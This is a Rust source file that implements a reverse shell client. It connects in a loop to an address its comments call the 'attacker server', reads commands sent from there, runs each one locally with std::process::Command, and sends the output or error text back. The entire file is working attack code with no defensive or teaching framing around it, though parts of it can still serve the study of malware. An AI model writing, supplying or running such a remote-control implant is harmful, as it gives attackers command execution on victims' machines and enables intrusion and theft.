use tokio::{io::{AsyncReadExt, AsyncWriteExt}, net::TcpStream};

use clap::Parser;

use std::process::Command;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    #[arg(short, long)]
    addr: String
}

async fn connect(addr: String) -> TcpStream {
    loop {
        match TcpStream::connect(addr.clone()).await {
            Ok(socket) => {
                println!("[MESSAGE] => Connection established successfuly");
                return socket;
            }
            Err(_) => {
                println!("trying to estbalish the connetion with [{}]", addr);
            }
        };
    }

}

#[tokio::main]
async fn main() {
    // parsing the arguments
    let args = Args::parse();

    // connection to attacker server
    let mut socket = connect(args.addr).await;

    // buffer to storage the data
    let mut buffer_command = [0u8;1024];

    loop {
        // TODO: make the parsing of the command for being able to accept arguments

        // get the command from attacker
        let n = match socket.read(&mut buffer_command).await {
            Ok(n) => n,
            Err(e) => {
                eprintln!("{:?}", e);
                socket.write_all(b"Error after command process").await.unwrap();
                return;
            },
        };

        let command = String::from_utf8_lossy(&buffer_command[..n]);
        
        println!("{}", command.trim());
        // executing the command
        let output_command = Command::new(command.trim()).output().expect("error ocurred in command process");

        if !output_command.status.success() {
            println!("{:?}", &output_command.status);

            let message_error = format!("error ocurred in command process \n[STATUS] => {} \n[ERROR_MESSAGE] => {}", &output_command.status, String::from_utf8_lossy(&output_command.stderr));

            socket.write_all(message_error.as_bytes()).await.unwrap();
            continue;
        }

        // send the outpu from the command to server attacker
        socket.write_all(String::from_utf8_lossy(&output_command.stdout).as_bytes()).await.unwrap();

    }
}